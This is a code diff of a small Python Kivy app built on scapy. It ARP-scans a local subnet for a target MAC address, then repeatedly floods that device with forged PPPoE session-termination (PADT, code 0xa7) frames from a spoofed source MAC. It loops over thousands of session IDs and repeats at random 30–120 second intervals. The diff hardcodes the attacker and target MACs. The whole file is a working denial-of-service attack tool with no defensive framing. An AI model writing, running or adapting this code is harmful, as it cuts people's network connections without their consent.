@@ -1,25 +1,22 @@
 # main.py
-import os
+
 import time
 from kivy.app import App
 from kivy.uix.textinput import TextInput
 from kivy.uix.button import Button
 from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.popup import Popup
-from math import *
 from scapy.all import *
 import random
 
 ipscan = '10.0.2.1/24'
-src = os.environ["SRC"]
-dst = os.environ["DST"]
 
 
 def st(mac):
     for i in range(6553):
         c = Ether() / PPPoE()
         c.dst = mac
-        c.src = src
+        c.src = '58:6a:b1:b4:a6:02'
         c.type = 0x8863
         c.payload.code = 0xa7
         c.payload.sessionid = i
@@ -51,12 +48,12 @@ class TextInputApp(App):
         else:
             for snd, rcv in ans:
 
-                if rcv[ARP].hwsrc == dst:
+                if rcv[ARP].hwsrc == "b0:25:aa:29:21:dd":
                     i=0
                     while True:
                         st(rcv[ARP].hwsrc)
                         i+=1
-                        self.out_text.text = "Done!，the" + str(i) + "time(s)"
+                        self.out_text.text = "Done!，the " + str(i) + " time(s)"
                         time.sleep(random.randint(30, 120))
                 else:
                     self.out_text.text = "Not Found!"
